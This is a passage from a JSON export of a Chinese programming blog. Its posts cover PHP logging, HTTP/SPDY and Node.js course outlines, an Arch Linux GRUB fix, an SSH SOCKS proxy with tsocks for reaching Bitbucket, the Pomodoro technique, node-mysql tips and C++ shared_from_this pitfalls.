class=\"org-ul\">\n<li>\u7c7b\u4f3cnginx\u7684\u8bbf\u95ee\u65e5\u5fd7\u8bb0\u5f55\u683c\u5f0f\n<\/li>\n<li>\u65e5\u5fd7\u4e2d\u8f93\u51fa\u6587\u4ef6\u540d\u53ca\u884c\u53f7\n<\/li>\n<li>\u65e5\u5fd7\u6587\u4ef6\u6570\u636e\u9650\u5236\u4e3a10\u4e2a\uff0c\u6bcf\u4e2a\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f\u4e3a10MB\n<\/li>\n<\/ul>\n<p>\n<a href=\"..\/static\/logging.inc\">logging.inc<\/a>\n<\/p>\n<\/li>\n\n<li>\u4f7f\u7528\u793a\u4f8b\n\n<p>\n<code>example.php<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #cc99cc;\">&lt;?php<\/span>\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">define(<\/span><span style=\"color: #66cccc;\">'LOGGING_APPNAME'<\/span>, <span style=\"color: #66cccc;\">'example'<\/span>);\n<span style=\"color: #99cc99;\">require_once<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">dirname(<\/span><span style=\"color: #6699cc;\">__FILE__<\/span>) . <span style=\"color: #66cccc;\">\"\/logging.inc\"<\/span>);\n\n$<span style=\"color: #ffcc66;\">logger<\/span> = <span style=\"color: #6699cc;\">Logger<\/span>::<span style=\"color: #cccccc; background-color: #2d2d2d;\">getLogger(<\/span><span style=\"color: #66cccc;\">\"main\"<\/span>);\n$<span style=\"color: #ffcc66;\">logger<\/span>-<span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d;\">debug<\/span>(<span style=\"color: #66cccc;\">\"info log\"<\/span>);\n$<span style=\"color: #ffcc66;\">logger<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">warn<\/span>(<span style=\"color: #66cccc;\">\"info log\"<\/span>);\n$<span style=\"color: #ffcc66;\">logger<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">error<\/span>(<span style=\"color: #66cccc;\">\"info log\"<\/span>);\n<span style=\"color: #cc99cc;\">?&gt;<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u8fd0\u884c\u7ed3\u679c\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">$ php .\/example.php\n$ tail -f .\/logs\/example.log\n2013-05-06 18:24:57,925 [DEBUG] main: info log (\/home\/tangxinfa\/php\/example.php:<span style=\"text-decoration: underline;\">6)<\/span>\n2013-05-06 18:24:57,930 [WARN] main: info log (\/home\/tangxinfa\/php\/example.php:7<span style=\"text-decoration: underline;\">)<\/span>\n2013-05-06 18:24:57,930 [ERROR] main: info log (\/home\/tangxinfa\/php\/example.php:<span style=\"text-decoration: underline;\">8)<\/span>\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u300a\u7406\u89e3Http\u4e0eSpdy\u534f\u8bae\u300b\u57f9\u8bad\u8bfe\u4ef6",
  "timestamp": "2013-05-23 13:11:00",
  "tags": [
    "http",
    "spdy"
  ],
  "body": "<p>\n\u672c\u8bfe\u4ef6\u9488\u5bf9\u521a\u5165\u804c\u7684\u6bd5\u4e1a\u751f\uff0c\u8bb2\u89e3Http\u4e0eSpdy\u534f\u8bae\u7684\u57fa\u7840\u77e5\u8bc6\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u5f00\u53d1\u8ba1\u5212 <code>[1\/5]<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li><code>[X]<\/code> \u7f16\u5199Http\u90e8\u5206\u5927\u7eb2\n<\/li>\n<li><code>[&#xa0;]<\/code> \u7f16\u5199Http\u90e8\u5206\u7ae0\u8282\u5185\u5bb9\n<\/li>\n<li><code>[&#xa0;]<\/code> \u7f16\u5199Spdy\u90e8\u5206\u5927\u7eb2\n<\/li>\n<li><code>[&#xa0;]<\/code> \u7f16\u5199Spdy\u90e8\u5206\u7ae0\u8282\u5185\u5bb9\n<\/li>\n<li><code>[&#xa0;]<\/code> \u5236\u4f5cMicrosoft PowerPoint\u683c\u5f0f\u6587\u6863\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5728\u7ebf\u6f14\u793a<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n<a href=\"http:\/\/blog.kankanan.com\/slides\/%E7%90%86%E8%A7%A3Http%E4%B8%8ESpdy%E5%8D%8F%E8%AE%AE.html\">\u300a\u7406\u89e3Http\u4e0eSpdy\u534f\u8bae\u300b<\/a><\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u300a\u7406\u89e3Node.js\u300b\u57f9\u8bad\u8bfe\u4ef6",
  "timestamp": "2013-07-04 18:31:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n\u672c\u8bfe\u4ef6\u4ecb\u7ecdNode.js\u7684\u7279\u70b9\u53ca\u5176\u521d\u6b65\u4f7f\u7528\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u5f00\u53d1\u8ba1\u5212 <code>[1\/3]<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li><code>[X]<\/code> \u7f16\u5199\u5927\u7eb2\n<\/li>\n<li><code>[&#xa0;]<\/code> \u7f16\u5199\u5185\u5bb9\n<\/li>\n<li><code>[&#xa0;]<\/code> \u5236\u4f5cMicrosoft PowerPoint\u683c\u5f0f\u6587\u6863\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5728\u7ebf\u6f14\u793a<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n<a href=\"http:\/\/blog.kankanan.com\/slides\/%E7%90%86%E8%A7%A3Node.js.html\">\u300a\u7406\u89e3Node.js\u300b<\/a><\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "Archlinux\u4e0b\u89e3\u51b3\u66f4\u65b0grub\u540e\u65e0\u6cd5\u8fdb\u5165gnome3\u684c\u9762\u7684\u95ee\u9898",
  "timestamp": "2013-06-26 10:07:00",
  "tags": [
    "archlinux"
  ],
  "body": "<p>\n\u5728\u542f\u52a8\u754c\u9762\u4e0a\u4f1a\u770b\u5230\u4ee5\u4e0b\u9519\u8bef\u65e5\u5fd7\uff1a\n<\/p>\n<pre class=\"example\">\nkernel: [    8.398186] [drm:radeon_init] *ERROR* No UMS support in radeon module!\n<\/pre>\n\n<p>\n\u8fd9\u4e2a\u662f\u7531\u4e8egrub\u914d\u7f6e\u6587\u4ef6\u4e2d\u6307\u5b9a\u4e86\u5185\u6838\u53c2\u6570 <code>nomodeset<\/code> \u5bfc\u81f4\uff0clinux\u7684\u9ed8\u8ba4\u914d\u7f6e\u662f\u4e3a\u4e86\u8fd0\u884c\u670d\u52a1\u5668\uff0c\u4ee5\u51cf\u5c11\u542f\u52a8\u8fc7\u7a0b\u4e2d\u51fa\u9519\u7684\u53ef\u80fd\u6027\uff0c\u4f7f\u7528gnome3\u684c\u9762\u65f6\uff0c\u9700\u53bb\u6389\u5185\u6838\u53c2\u6570 <code>nomodeset<\/code> \uff0c\u4ee5\u4e0b\u4e3a<a href=\"https:\/\/wiki.archlinux.org\/index.php\/ATI#Disable_KMS\">\u539f\u6587<\/a>\uff1a\n<\/p>\n\n<pre class=\"example\">\nNote: Adding nomodeset to the kernel boot line might prevent GNOME 3's gnome-shell or KDE's desktop effects from running.\n<\/pre>\n"
},
{
  "title": "linux\u4e0b\u7ffb\u5899\u8bbf\u95eebitbucket.org\u4ed3\u5e93",
  "timestamp": "2013-06-28 13:57:00",
  "tags": [
    "linux",
    "hg",
    "bitbucket"
  ],
  "body": "<p>\n\u4eca\u5929\u5f80bitbucket.org push\u65f6\u624d\u53d1\u73b0bitbucket\u88abGFW\u4e86\u3002\u6211\u7684\u4ed3\u5e93\u4e3aMercurial hg\uff0chg\u9879\u76ee\u6839\u76ee\u5f55\u4e0b\u7684 <code>.hg\/hgrc<\/code> \u914d\u7f6e\u6587\u4ef6\u4e2d\u53ef\u6307\u5b9ahttp_proxy\uff0c\u8bd5\u4e86\u4e00\u4e0b\u4e0d\u652f\u6301socks\u4ee3\u7406\uff08\u6211\u7684\u6d4f\u89c8\u5668\u7528\u5b83\u6765\u7ffb\u5899\uff09\uff0c\u6700\u7ec8\u4f7f\u7528tsocks\u8f6f\u4ef6\u5b9e\u73b0\u7ffb\u5899\u8bbf\u95eebitbucket.org\u4ed3\u5e93\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5229\u7528vps\u5efa\u672c\u5730socks\u4ee3\u7406\u7684\u811a\u672c <code>ssh_proxy.sh<\/code>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">!\/bin\/<\/span><span style=\"color: #99cc99;\">bash<\/span>\n\n<span style=\"color: #ffcc66;\">n<\/span>=<span style=\"color: #cc99cc;\">`ps waux | grep 'bash .*\/ssh_proxy.sh' | grep -v grep | wc -l`<\/span>\n<span style=\"color: #99cc99;\">if<\/span> [ $<span style=\"color: #ffcc66;\">n<\/span> -lt 3 ]; <span style=\"color: #99cc99;\">then<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span> [ true ]; <span style=\"color: #99cc99;\">do<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">n<\/span>=<span style=\"color: #cc99cc;\">`ps aux | grep 'ssh' | grep '7070' | grep -v grep | wc -l`<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> [ $<span style=\"color: #ffcc66;\">n<\/span> -lt 1 ]; <span style=\"color: #99cc99;\">then<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cc99cc;\">echo<\/span> <span style=\"color: #66cccc;\">\"start ssh connecting\"<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   ssh -qTnNf -D 7070 user@host\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">fi<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cc99cc;\">echo<\/span> <span style=\"color: #66cccc;\">\"wait for next checking\"<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   sleep 30\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">done<\/span>\n<span style=\"color: #99cc99;\">fi<\/span>\n<span style=\"color: #cc99cc;\">echo<\/span> <span style=\"color: #66cccc;\">\"ssh_proxy.sh already running\"<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u8bf7\u5c06user@host\u6539\u4e3a\u4f60\u7684vps\u7528\u6237\u53ca\u4e3b\u673a\uff0c\u5e76\u914d\u7f6e\u4e3a\u514d\u8f93\u5165\u5bc6\u7801\u3002\n<\/p>\n<\/li>\n\n<li>\u542f\u52a8socks\u4ee3\u7406\u811a\u672c\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">nohup bash .\/ssh_proxy.sh &amp;\n<\/pre>\n<\/div>\n\n<p>\n\u6d4f\u89c8\u5668\u4e5f\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u7ffb\u5899\u3002\n<\/p>\n<\/li>\n\n<li>\u5b89\u88c5tsocks\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S tsocks\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u914d\u7f6etsocks\n\n<p>\n<code>\/etc\/tsocks.conf<\/code>\n<\/p>\n<pre class=\"example\">\n# We can access 192.168.0.* directly\nlocal = 192.168.0.0\/255.255.255.0\nlocal = 10.0.0.0\/255.0.0.0\n\n# Otherwise we use the server\nserver = 127.0.0.1\nserver_port = 7070\n<\/pre>\n<p>\n\u5177\u4f53\u7528\u6cd5 <code>man tsocks.conf<\/code>\n<\/p>\n<\/li>\n\n<li>\u4f7f\u7528tsocks\u8ba9hg\u7528\u4e0asocks\u4ee3\u7406\u529f\u80fd\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">tsocks hg push\n<\/pre>\n<\/div>\n<p>\ntsocks\u770b\u8d77\u6765\u5f88\u901a\u7528\uff0c\u5e94\u8be5\u4e5f\u53ef\u4ee5\u8ba9git\u7b49\u8fdb\u884csocks\u4ee3\u7406\u8bbf\u95ee\u3002<\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "\u4f7f\u7528\u756a\u8304\u5de5\u4f5c\u6cd5\u7684\u611f\u53d7",
  "timestamp": "2013-07-08 13:10:00",
  "tags": [
    "pomodoro"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u57fa\u672c\u8981\u9886<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u4ece\u4e8b\u52a1\u6e05\u5355\u4e2d\u9009\u51fa\u4eca\u5929\u8981\u505a\u7684\u4e8b\n<\/p>\n\n<p>\n\u6309\u4f18\u5148\u7ea7\u586b\u5165\u4eca\u65e5\u5de5\u4f5c\u8ba1\u5212\u8868\n<\/p>\n\n<p>\n\u4ece\u8868\u4e2d\u9009\u62e9\u7b2c\u4e00\u9879\u672a\u5b8c\u6210\u4e8b\u52a1\u6309\u4e0b\u8ba1\u65f6\u5668\n<\/p>\n\n<p>\n\u4e13\u5fc3\u505a\u8fd9\u4ef6\u4e8b\n<\/p>\n\n<p>\n25\u949f\u540e\u94c3\u54cd\u7acb\u5373\u505c\u6b62\u505a\u4e8b\n<\/p>\n\n<p>\n\u5728\u5f53\u524d\u4e8b\u52a1\u540e\u6807\u8bb0\u7528\u6389\u4e86\u4e00\u4e2a\u756a\u8304\n<\/p>\n\n<p>\n\u4e8b\u52a1\u5b8c\u6210\u5219\u5728\u4eca\u65e5\u4e8b\u52a1\u6e05\u5355\u5212\u6389\u5f53\u524d\u4efb\u52a1\n<\/p>\n\n<p>\n\u4e13\u5fc3\u4f11\u606f\u57305\u5206\u949f\uff08\u6bcf4\u4e2a\u5468\u671f\u957f\u4f11\u606f15-30\u5206\u949f\uff09\n<\/p>\n\n<p>\n\u6309\u4e0b\u8ba1\u65f6\u5668\n<\/p>\n\n<p>\n\u7ee7\u7eed\u505a\u4e8b\n<\/p>\n\n<p>\n\u5982\u6b64\u5f80\u590d\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u638c\u63a7\u5e72\u6270\u56e0\u7d20<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>\u505a\u4e8b\u65f6\u5982\u9047\u5b9e\u53d1\u4e8b\u4ef6\u914c\u60c5\u5904\u7406\uff1a\n\n<ul class=\"org-ul\">\n<li>\u6dfb\u52a0\u5230\u4e8b\u52a1\u6e05\u5355\u4e2d\u660e\u5929\u518d\u5904\u7406\n<\/li>\n<li>\u76f4\u63a5\u5b89\u6392\u5230\u4eca\u65e5\u4e8b\u52a1\u6e05\u5355\u7a0d\u540e\u5904\u7406\n<\/li>\n<li>\u7acb\u5373\u53d6\u6d88\u5f53\u524d\u4e8b\u52a1\u5f00\u59cb\u5904\u7406\u7a81\u53d1\u4e8b\u4ef6\n<\/li>\n<\/ul>\n<\/li>\n\n<li>\u5728\u5f53\u524d\u4e8b\u52a1\u540e\u65b9\u6253\u4e2a\u4e2d\u65ad\u6807\u8bb0\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u89e3\u8bfb\u5de5\u4f5c\u8bb0\u5f55<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u4e00\u5929\u7ed3\u675f\u540e\u6211\u4eec\u5c06\u83b7\u5f97\u4ee5\u4e0b\u4fe1\u606f\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u77e5\u9053\u5904\u7406\u67d0\u4e2a\u4e8b\u52a1\u7528\u65f6\u591a\u5c11\u3002\u600e\u6837\u8ba9\u65f6\u95f4\u7528\u5f97\u66f4\u5c11\uff1f\n<\/li>\n\n<li>\u77e5\u9053\u65f6\u95f4\u82b1\u5728\u54ea\u91cc\u53bb\u4e86\u3002\u80fd\u5426\u5c06\u65f6\u95f4\u66f4\u591a\u82b1\u5728\u6709\u6548\u5904\u7406\u5de5\u4f5c\u4e0a\uff1f\n<\/li>\n<\/ul>\n\n<p>\n\u5f53\u65b0\u7684\u4e00\u5929\u5f00\u59cb\u65f6\uff0c\u6211\u4eec\u4f1a\u6e05\u695a\u5730\u77e5\u9053\u6bcf\u5929\u6709\u591a\u5c11\u4e2a\u756a\u8304\u53ef\u7528\uff0c\u4eca\u5929\u53ef\u4ee5\u5b89\u6392\u591a\u5c11\u4e8b\u52a1\uff0c\u6bcf\u4e2a\u4e8b\u52a1\u9700\u8981\u6d88\u8017\u591a\u5c11\u4e2a\u756a\u8304\u3002\n<\/p>\n\n<p>\n\u968f\u7740\u6211\u4eec\u4e0d\u65ad\u5730\u6839\u636e\u8fd9\u4e9b\u8bb0\u5f55\u6539\u8fdb\u6211\u4eec\u7684\u5de5\u4f5c\u6548\u7387\uff0c\u6700\u7ec8\u6211\u4eec\u80fd\u591f\u5b89\u6392\u65f6\u95f4\u3001\u638c\u63a7\u65f6\u95f4\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u756a\u8304\u5de5\u4f5c\u6cd5\u9075\u4ece\u4e60\u60ef\u6cd5\u5219<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n\u5f53\u6211\u8ddf\u8001\u5a46\u89e3\u91ca\u756a\u8304\u5de5\u4f5c\u6cd5\u65f6\uff0c\u5979\u8bf4\u4e86\u53e5\uff1a\u201c\u8fd9\u4e2a\u548c\u4f60\u4e4b\u524d\u8bf4\u7684\u4e60\u60ef\u6cd5\u5219\u5f88\u50cf\u201d\uff0c\u7ec6\u7ec6\u4e00\u60f3\u4e0d\u65e0\u9053\u7406\u3002\n<\/p>\n\n<p>\n\u4e60\u60ef\u7684\u5f62\u6210\u7684\u4e09\u4e2a\u6b65\u9aa4\uff1a\u6697\u793a\u3001\u60ef\u5e38\u884c\u4e3a\u3001\u5956\u8d4f\u3002\u4ee5\u53ca\u4e60\u60ef\u56de\u8def\u3002\n<\/p>\n\n<p>\n\u756a\u8304\u5de5\u4f5c\u6cd5\u4e5f\u6709\u8fd9\u4e09\u4e2a\u8981\u7d20\uff1a\n<\/p>\n\n<p>\n\u3000\u3000\u6697\u793a\u3000\u3000\u3000\u3000\u3000\u3000\u6309\u4e0b\u8ba1\u65f6\u5668\n<\/p>\n\n<p>\n\u3000\u3000\u60ef\u5e38\u884c\u4e3a\u3000\u3000\u3000\u3000\u5904\u7406\u4e8b\u52a1\n<\/p>\n\n<p>\n\u3000\u3000\u5956\u8d4f\u3000\u3000\u3000\u3000\u3000\u3000\u6e05\u8106\u7684\u94c3\u54cd\u3001\u6807\u8bb0\u756a\u8304\u7684\u6210\u5c31\u611f\u3001\u4f11\u606f\u65f6\u95f4\u7684\u653e\u677e\n<\/p>\n\n<p>\n\u800c\u4e60\u60ef\u56de\u8def\u7684\u5f62\u6210\u4e5f\u5bb9\u6613\u53d1\u73b0\uff0c\u6bcf\u5929\u4e00\u65e9\u6765\u5230\u516c\u53f8\uff0c\u8c01\u4e0d\u6e34\u671b\u4eca\u5929\u80fd\u591f\u8fc7\u5f97\u5145\u6ee1\u6210\u5c31\u611f\u3001\u4f11\u606f\u65f6\u80fd\u591f\u6beb\u65e0\u987e\u5fcc\u5462\u3002\n<\/p>\n\n<p>\n\u9075\u4ece\u4e60\u60ef\u6cd5\u5219\u7684\u65b9\u6cd5\u8bba\u624d\u4f1a\u66f4\u5bb9\u6613\u5c55\u5f00\u5e76\u957f\u4e45\u5730\u575a\u6301\u4e0b\u53bb\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">\u53c2\u8003\u8d44\u6599<\/h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<p>\n<a href=\"http:\/\/www.pomodorotechnique.com\/download\/pdf\/ThePomodoroTechnique-CHN_v1-3.pdf\">\u300a\u756a\u8304\u5de5\u4f5c\u6cd5\u300b<\/a>\n<a href=\"http:\/\/baike.baidu.com\/view\/5259318.htm\">\u756a\u8304\u5de5\u4f5c\u6cd5_\u767e\u5ea6\u767e\u79d1<\/a>\n<a href=\"http:\/\/pomodoro.kankanan.com\">\u756a\u8304\u5de5\u4f5c\u6cd5\u5728\u7ebf\u670d\u52a1<\/a><\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "node.js\u4e0b\u8bbf\u95eemysql\u6ce8\u610f\u4e8b\u9879",
  "timestamp": "2013-10-11 10:45:00",
  "tags": [
    "node",
    "mysql"
  ],
  "body": "<p>\n\u672c\u6587\u4ec5\u9488\u5bf9 <a href=\"https:\/\/github.com\/felixge\/node-mysql\">node-mysql<\/a> \u6a21\u5757\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>Connection \u5bf9\u8c61\u4e3a\u4e00\u4e2a\u5230mysql\u7684\u8fde\u63a5\uff0c\u5728\u5176\u4e0a\u7684query\u662f\u4e32\u884c\u8fdb\u884c\u7684\u3002\n\n<p>\n\u7531\u4e8emysql\u534f\u8bae\u7c7b\u4f3chttp\u662f\u4e32\u884c\u7684\uff0c\u5728\u4e00\u4e2amysql\u8fde\u63a5\u4e0a\u7684\u591a\u4e2aquery\u5fc5\u987b\u4f9d\u6b21\u8fdb\u884c\u3002\n<\/p>\n\n<p>\n<a href=\"https:\/\/github.com\/felixge\/node-mysql\">node-mysql<\/a> \u7684 Connection\u5bf9\u8c61\u4e0a\u540c\u65f6\u53d1\u8d77\u7684\u591a\u4e2aquery\u4f1a\u961f\u5217\u5316\uff0c\n<\/p>\n\n<p>\n\u5904\u7406\u5b8c\u4e00\u4e2aquery\u518d\u8fdb\u884c\u4e0b\u4e00query\u7684\u5904\u7406\uff0c\u4f20\u9012\u7ed9\u56de\u8c03\u51fd\u6570\u7684query\u7ed3\u679c\u4e0d\u4f1a\u9519\u4e71\u3002\n<\/p>\n\n<p>\n\u5728\u6709\u4e00\u5b9a\u8bbf\u95ee\u91cf\u7684\u670d\u52a1\u4e2d\u5e94\u8be5\u603b\u662f\u4f7f\u7528 <code>\u8fde\u63a5\u6c60<\/code> \u3002\n<\/p>\n<\/li>\n<\/ul>\n\n\n<ul class=\"org-ul\">\n<li>\u5904\u7406Connection\u5bf9\u8c61\u7684\u91cd\u8fde\u3002\n\n<p>\nmysql\u8fde\u63a5\u7a7a\u95f2\u4e00\u6bb5\u65f6\u95f4\u540e\uff08\u9ed8\u8ba48\u5c0f\u65f6\uff09\u4f1a\u81ea\u52a8\u5173\u95ed\uff0c\n<\/p>\n\n<p>\n\u53ef\u4ee5\u5728Connection\u5bf9\u8c61\u7684 <code>error<\/code> \u4e8b\u4ef6\u4e2d\u68c0\u6d4b\u540e\u8fde\u63a5\u65ad\u5f00\u65f6\u8fdb\u884c\u91cd\u8fde\u3002\n<\/p>\n\n<p>\n\u4f7f\u7528 <code>\u8fde\u63a5\u6c60<\/code> \u4e0d\u4f1a\u6709\u95ee\u9898\uff0c\u8fde\u63a5\u65ad\u5f00\u540e\u4f1a\u9ed8\u8ba4\u4ece\u8fde\u63a5\u6c60\u4e2d\u5254\u9664\u3002<\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u5728\u6784\u9020\u51fd\u6570\u4e2d\u8c03\u7528shared_from_this",
  "timestamp": "2013-12-20 01:02:00",
  "tags": [
    "cpp"
  ],
  "body": "<p>\n\u5148\u770b\u793a\u4f8b\u4ee3\u7801\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #99cc99;\">class<\/span> <span style=\"color: #6699cc;\">Chicken<\/span> : <span style=\"color: #99cc99;\">public<\/span> <span style=\"color: #6699cc;\">enable_shared_from_this<\/span>&lt;<span style=\"color: #6699cc;\">Chicken<\/span>&gt;\n{\n<span style=\"color: #99cc99;\">public<\/span>:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #f99157;\">Chicken<\/span>()\n<span style=\"background-color: #515151;\"> <\/span>   {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">shared_ptr<\/span>&lt;<span style=\"color: #6699cc;\">Chicken<\/span>&gt; <span style=\"color: #ffcc66;\">chicken_ptr<\/span> = shared_from_this();    <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">throw std::ba<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">d_weak_ptr<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n};\n<\/pre>\n<\/div>\n\n<p>\n\u518d\u770bshared_from_this()\u7684\u884c\u4e3a\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #99cc99;\">return<\/span> _weak_ptr-&gt;lock();\n<\/pre>\n<\/div>\n\n<p>\n<code>_weak_ptr<\/code> \u4e3a\u7236\u7c7b\uff08 <code>enable_shared_from_this<\/code> &lt;Chicken&gt;\uff09\u7684\u6210\u5458\u53d8\u91cf\uff0c\u9700\u8981\u4e00\u4e2a <code>shared_ptr<\/code> &lt;Chicken&gt;\u5bf9\u8c61\u6765\u521d\u59cb\u5316\u5b83\uff0c\u800c <code>shared_ptr<\/code> &lt;Chicken&gt;\u9700\u8981\u4e00\u4e2aChicken\u5bf9\u8c61\u6765\u521b\u5efa\uff0c\u4f46\u6b64\u65f6Chicken\u5bf9\u8c61\u6b63\u5728\u6784\u9020\u4e2d\uff0c\u8fd9\u662f\u4e2a\u9e21\u4e0e\u86cb\u7684\u65e0\u89e3\u95ee\u9898\u3002\n<\/p>\n\n<p>\n\u5176\u5b9e <code>_weak_ptr<\/code> \u6210\u5458\u53d8\u91cf\u662f\u5728 <code>shared_ptr<\/code> \u7684\u6784\u9020\u51fd\u6570\u4e2d\u5ef6\u8fdf\u521d\u59cb\u5316\u7684\uff0c\u4e0d\u53ea\u662f\u5728\u6784\u9020\u51fd\u6570\u4e2d\u4e0d\u80fd\u8c03\u7528 <code>shared_from_this<\/code> \uff0c\u50cf\u4e0b\u9762\u7684\u4f7f\u7528\u65b9\u5f0f\u540c\u6837\u4e0d\u884c\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #6699cc;\">Chicken<\/span>* <span style=\"color: #ffcc66;\">chicken<\/span> = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">Chicken<\/span>();\n<span style=\"color: #6699cc;\">shared_ptr<\/span>&lt;<span style=\"color: #6699cc;\">Chicken<\/span>&gt; <span style=\"color: #ffcc66;\">chicken_ptr<\/span> = chicken-&gt;shared_from_this();  <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">throw std::bad<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">_weak_ptr<\/span>\n<\/pre>\n<\/div>\n\n<p>\n<code>enable_shared_from_this<\/code> \u4e0d\u662f\u4ecethis\u797c\u6307\u9488\u53d8\u51fa\u667a\u80fd\u6307\u9488\u7684\u9b54\u6cd5\uff0c\u5b83\u53ea\u662f\u4e00\u4e2a\u8f85\u52a9\u7c7b\uff0c\u4e3a\u4e00\u4e2a\u53ea\u4f7f\u7528 <code>shared_ptr<\/code> \u7ba1\u7406\u5bf9\u8c61\u751f\u547d\u5468\u671f\u7684\u7c7b\u6dfb\u52a0\u4e00\u4e2a\u81ea\u8eab\u7684\u667a\u80fd\u6307\u9488\u6210\u5458\u53d8\u91cf\u4f9b\u5185\u90e8\u4f7f\u7528\u3002\n<\/p>\n\n<p>\n\u800c\u201c\u4e0d\u80fd\u5728\u6784\u9020\u51fd\u6570\u4e2d\u8c03\u7528 <code>shared_from_this<\/code> \u201d\u8fd9\u4e2a\u95ee\u9898\u4ec5\u4ec5\u662f\u6807\u51c6\u5b9e\u73b0\u4e0a\u7684\u4e00\u4e2a\u6f0f\u6d1e\u3002\n<\/p>\n\n<p>\n\u4f60\u5e94\u8be5\u50cf\u4e0b\u9762\u8fd9\u6837\u7528\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #99cc99;\">class<\/span> <span style=\"color: #6699cc;\">Chicken<\/span> : <span style=\"color: #99cc99;\">public<\/span> <span style=\"color: #6699cc;\">enable_shared_from_this<\/span>&lt;<span 